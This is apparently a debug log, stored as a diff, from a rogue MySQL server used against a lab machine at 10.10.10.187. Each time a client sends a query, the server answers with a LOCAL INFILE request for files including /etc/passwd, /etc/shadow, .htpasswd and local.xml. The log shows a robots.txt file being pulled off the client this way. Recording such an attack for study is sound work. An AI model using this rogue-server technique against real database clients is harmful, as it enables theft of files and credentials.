+2020-06-20 23:35:36,771:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:36,771:INFO:-- result
+2020-06-20 23:35:36,771:INFO:Result: '\x02'
+2020-06-20 23:35:36,771:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:36,772:INFO:Last packet
+2020-06-20 23:35:36,817:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:35:36,818:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:35:36,818:INFO:Query
+2020-06-20 23:35:36,818:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:35:36,863:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:36,863:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:36,863:INFO:-- result
+2020-06-20 23:35:36,864:INFO:Result: '\x02'
+2020-06-20 23:35:36,864:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:36,864:INFO:Last packet
+2020-06-20 23:35:36,912:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:35:36,912:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:35:36,912:INFO:Query
+2020-06-20 23:35:36,912:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:35:36,958:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:36,958:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:36,958:INFO:-- result
+2020-06-20 23:35:36,958:INFO:Result: '\x02'
+2020-06-20 23:35:36,958:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:36,958:INFO:Last packet
+2020-06-20 23:35:37,005:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:35:37,005:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:35:37,005:INFO:Query
+2020-06-20 23:35:37,005:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:35:37,051:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:35:37,051:DEBUG:Data recved: '\x02'
+2020-06-20 23:35:37,051:INFO:-- result
+2020-06-20 23:35:37,051:INFO:Result: '\x02'
+2020-06-20 23:35:37,051:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:35:37,051:INFO:Last packet
+2020-06-20 23:35:37,098:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:35:37,098:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:35:37,098:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:35:37,098:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:37:10,582:INFO:Conn from: ('10.10.10.187', 40560)
+2020-06-20 23:37:10,582:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:37:10,628:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:37:10,628:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:37:10,628:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:10,629:INFO:Last packet
+2020-06-20 23:37:10,675:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:37:10,675:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:37:10,675:INFO:Query
+2020-06-20 23:37:10,675:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:37:10,721:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:10,722:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:10,722:INFO:-- result
+2020-06-20 23:37:10,722:INFO:Result: '\x02'
+2020-06-20 23:37:10,722:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:10,722:INFO:Last packet
+2020-06-20 23:37:10,768:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:37:10,768:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:37:10,768:INFO:Query
+2020-06-20 23:37:10,768:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:37:10,814:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:10,814:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:10,814:INFO:-- result
+2020-06-20 23:37:10,814:INFO:Result: '\x02'
+2020-06-20 23:37:10,814:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:10,814:INFO:Last packet
+2020-06-20 23:37:10,862:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:37:10,862:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:37:10,862:INFO:Query
+2020-06-20 23:37:10,862:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:37:10,928:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:10,928:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:10,928:INFO:-- result
+2020-06-20 23:37:10,928:INFO:Result: '\x02'
+2020-06-20 23:37:10,928:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:10,928:INFO:Last packet
+2020-06-20 23:37:10,975:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:37:10,975:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:37:10,975:INFO:Query
+2020-06-20 23:37:10,975:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:37:11,021:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:11,021:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:11,021:INFO:-- result
+2020-06-20 23:37:11,021:INFO:Result: '\x02'
+2020-06-20 23:37:11,021:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:11,021:INFO:Last packet
+2020-06-20 23:37:11,068:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:37:11,069:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:37:11,069:INFO:Query
+2020-06-20 23:37:11,069:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:37:11,118:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:11,119:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:11,119:INFO:-- result
+2020-06-20 23:37:11,119:INFO:Result: '\x02'
+2020-06-20 23:37:11,119:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:11,119:INFO:Last packet
+2020-06-20 23:37:11,212:INFO:Conn from: ('10.10.10.187', 40562)
+2020-06-20 23:37:11,212:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:37:11,260:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:37:11,260:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:37:11,260:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:11,260:INFO:Last packet
+2020-06-20 23:37:11,310:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:37:11,310:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:37:11,310:INFO:Query
+2020-06-20 23:37:11,310:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:37:11,384:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:11,385:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:11,385:INFO:-- result
+2020-06-20 23:37:11,385:INFO:Result: '\x02'
+2020-06-20 23:37:11,385:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:11,385:INFO:Last packet
+2020-06-20 23:37:11,448:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:37:11,448:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:37:11,448:INFO:Query
+2020-06-20 23:37:11,448:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:37:11,497:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:11,497:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:11,497:INFO:-- result
+2020-06-20 23:37:11,497:INFO:Result: '\x02'
+2020-06-20 23:37:11,497:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:11,497:INFO:Last packet
+2020-06-20 23:37:11,543:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:37:11,543:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:37:11,543:INFO:Query
+2020-06-20 23:37:11,543:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:37:11,589:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:11,589:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:11,589:INFO:-- result
+2020-06-20 23:37:11,589:INFO:Result: '\x02'
+2020-06-20 23:37:11,589:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:11,589:INFO:Last packet
+2020-06-20 23:37:11,637:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:37:11,637:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:37:11,637:INFO:Query
+2020-06-20 23:37:11,638:DEBUG:Pushed: '\r\x00\x00\x01\xfb./robots.txt'
+2020-06-20 23:37:11,684:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:11,684:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:11,684:INFO:-- result
+2020-06-20 23:37:11,684:INFO:Result: '\x02'
+2020-06-20 23:37:11,684:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:11,684:INFO:Last packet
+2020-06-20 23:37:11,730:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:37:11,730:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:37:11,730:INFO:Query
+2020-06-20 23:37:11,730:DEBUG:Pushed: '\r\x00\x00\x01\xfb./robots.txt'
+2020-06-20 23:37:11,776:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:11,776:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:11,776:INFO:-- result
+2020-06-20 23:37:11,776:INFO:Result: '\x02'
+2020-06-20 23:37:11,776:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:11,776:INFO:Last packet
+2020-06-20 23:37:11,823:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:37:11,823:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:37:11,823:INFO:Query
+2020-06-20 23:37:11,823:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb./.htpasswd'
+2020-06-20 23:37:11,869:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:37:11,869:DEBUG:Data recved: '\x02'
+2020-06-20 23:37:11,869:INFO:-- result
+2020-06-20 23:37:11,869:INFO:Result: '\x02'
+2020-06-20 23:37:11,870:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:37:11,870:INFO:Last packet
+2020-06-20 23:37:11,935:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:37:11,935:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:37:11,935:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:37:11,935:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:41:14,850:INFO:Conn from: ('10.10.10.187', 40704)
+2020-06-20 23:41:14,850:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:41:14,901:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:41:14,902:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:41:14,902:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:41:14,902:INFO:Last packet
+2020-06-20 23:41:14,950:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:41:14,950:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:41:14,950:INFO:Query
+2020-06-20 23:41:14,950:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-20 23:41:14,997:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:41:14,997:DEBUG:Data recved: '\x02'
+2020-06-20 23:41:14,997:INFO:-- result
+2020-06-20 23:41:14,997:INFO:Result: '\x02'
+2020-06-20 23:41:14,997:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:41:14,998:INFO:Last packet
+2020-06-20 23:41:15,044:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:41:15,044:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:41:15,044:INFO:Query
+2020-06-20 23:41:15,044:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-20 23:41:15,090:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-20 23:41:15,090:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:41:15,090:INFO:-- result
+2020-06-20 23:41:15,090:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:41:15,090:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:41:15,090:DEBUG:Data recved: '\x03'
+2020-06-20 23:41:15,091:INFO:-- result
+2020-06-20 23:41:15,091:INFO:Result: '\x03'
+2020-06-20 23:41:15,091:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:41:15,091:INFO:Last packet
+2020-06-20 23:41:15,137:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:41:15,137:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:41:15,137:INFO:Query
+2020-06-20 23:41:15,137:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:41:15,185:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:41:15,185:DEBUG:Data recved: '\x02'
+2020-06-20 23:41:15,185:INFO:-- result
+2020-06-20 23:41:15,185:INFO:Result: '\x02'
+2020-06-20 23:41:15,185:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:41:15,185:INFO:Last packet
+2020-06-20 23:41:15,231:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:41:15,231:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:41:15,231:INFO:Query
+2020-06-20 23:41:15,231:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-20 23:41:15,279:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:41:15,279:DEBUG:Data recved: '\x02'
+2020-06-20 23:41:15,279:INFO:-- result
+2020-06-20 23:41:15,279:INFO:Result: '\x02'
+2020-06-20 23:41:15,280:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:41:15,280:INFO:Last packet
+2020-06-20 23:41:15,326:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:41:15,326:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:41:15,326:INFO:Query
+2020-06-20 23:41:15,326:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-20 23:41:15,373:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-20 23:41:15,373:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:41:15,373:INFO:-- result
+2020-06-20 23:41:15,373:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:41:15,373:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:41:15,374:DEBUG:Data recved: '\x03'
+2020-06-20 23:41:15,374:INFO:-- result
+2020-06-20 23:41:15,374:INFO:Result: '\x03'
+2020-06-20 23:41:15,374:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:41:15,374:INFO:Last packet
+2020-06-20 23:41:15,426:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:41:15,426:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:43:35,623:INFO:Conn from: ('10.10.10.187', 40706)
+2020-06-20 23:43:35,624:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:43:35,673:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:43:35,673:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:43:35,673:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:35,673:INFO:Last packet
+2020-06-20 23:43:35,860:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:43:35,860:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:43:35,860:INFO:Query
+2020-06-20 23:43:35,860:DEBUG:Pushed: '\r\x00\x00\x01\xfb../local.xml'
+2020-06-20 23:43:35,938:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:35,938:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:35,938:INFO:-- result
+2020-06-20 23:43:35,938:INFO:Result: '\x02'
+2020-06-20 23:43:35,938:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:35,938:INFO:Last packet
+2020-06-20 23:43:35,985:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:43:35,985:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:43:35,985:INFO:Query
+2020-06-20 23:43:35,985:DEBUG:Pushed: '\r\x00\x00\x01\xfb../local.xml'
+2020-06-20 23:43:36,031:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:36,031:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:36,031:INFO:-- result
+2020-06-20 23:43:36,031:INFO:Result: '\x02'
+2020-06-20 23:43:36,031:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:36,031:INFO:Last packet
+2020-06-20 23:43:36,079:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:43:36,080:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:43:36,080:INFO:Query
+2020-06-20 23:43:36,080:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-20 23:43:36,126:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:36,126:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:36,126:INFO:-- result
+2020-06-20 23:43:36,126:INFO:Result: '\x02'
+2020-06-20 23:43:36,126:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:36,126:INFO:Last packet
+2020-06-20 23:43:36,178:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:43:36,178:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:43:36,178:INFO:Query
+2020-06-20 23:43:36,178:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-20 23:43:36,227:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:36,227:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:36,227:INFO:-- result
+2020-06-20 23:43:36,227:INFO:Result: '\x02'
+2020-06-20 23:43:36,227:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:36,227:INFO:Last packet
+2020-06-20 23:43:36,273:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-20 23:43:36,274:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-20 23:43:36,274:INFO:Query
+2020-06-20 23:43:36,274:DEBUG:Pushed: '\r\x00\x00\x01\xfb../local.xml'
+2020-06-20 23:43:36,322:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:36,323:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:36,323:INFO:-- result
+2020-06-20 23:43:36,323:INFO:Result: '\x02'
+2020-06-20 23:43:36,323:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:36,323:INFO:Last packet
+2020-06-20 23:43:36,417:INFO:Conn from: ('10.10.10.187', 40708)
+2020-06-20 23:43:36,418:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-20 23:43:36,464:DEBUG:Data recved: '9\x00\x00'
+2020-06-20 23:43:36,464:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-20 23:43:36,464:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:36,464:INFO:Last packet
+2020-06-20 23:43:36,613:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:43:36,614:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:43:36,614:INFO:Query
+2020-06-20 23:43:36,614:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-20 23:43:36,841:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:36,841:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:36,841:INFO:-- result
+2020-06-20 23:43:36,841:INFO:Result: '\x02'
+2020-06-20 23:43:36,841:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:36,841:INFO:Last packet
+2020-06-20 23:43:37,013:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:43:37,013:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:43:37,014:INFO:Query
+2020-06-20 23:43:37,014:DEBUG:Pushed: '\r\x00\x00\x01\xfb../local.xml'
+2020-06-20 23:43:37,060:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:37,060:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:37,060:INFO:-- result
+2020-06-20 23:43:37,060:INFO:Result: '\x02'
+2020-06-20 23:43:37,060:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:37,060:INFO:Last packet
+2020-06-20 23:43:37,107:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:43:37,107:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:43:37,107:INFO:Query
+2020-06-20 23:43:37,107:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-20 23:43:37,154:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:37,154:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:37,154:INFO:-- result
+2020-06-20 23:43:37,154:INFO:Result: '\x02'
+2020-06-20 23:43:37,155:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:37,155:INFO:Last packet
+2020-06-20 23:43:37,201:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:43:37,201:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:43:37,201:INFO:Query
+2020-06-20 23:43:37,201:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-20 23:43:37,247:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:37,247:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:37,248:INFO:-- result
+2020-06-20 23:43:37,248:INFO:Result: '\x02'
+2020-06-20 23:43:37,248:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:37,248:INFO:Last packet
+2020-06-20 23:43:37,297:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:43:37,297:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:43:37,297:INFO:Query
+2020-06-20 23:43:37,297:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-20 23:43:37,343:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:37,343:DEBUG:Data recved: '\x02'
+2020-06-20 23:43:37,343:INFO:-- result
+2020-06-20 23:43:37,343:INFO:Result: '\x02'
+2020-06-20 23:43:37,343:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:37,343:INFO:Last packet
+2020-06-20 23:43:37,390:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:43:37,390:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:43:37,390:INFO:Query
+2020-06-20 23:43:37,390:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-20 23:43:37,436:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-20 23:43:37,436:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:43:37,436:INFO:-- result
+2020-06-20 23:43:37,436:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-20 23:43:37,436:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:43:37,436:DEBUG:Data recved: '\x03'
+2020-06-20 23:43:37,437:INFO:-- result
+2020-06-20 23:43:37,437:INFO:Result: '\x03'
+2020-06-20 23:43:37,437:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:43:37,437:INFO:Last packet
+2020-06-20 23:43:37,484:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:43:37,484:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:43:37,484:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:43:37,484:DEBUG:Data recved: '\x00\x01'
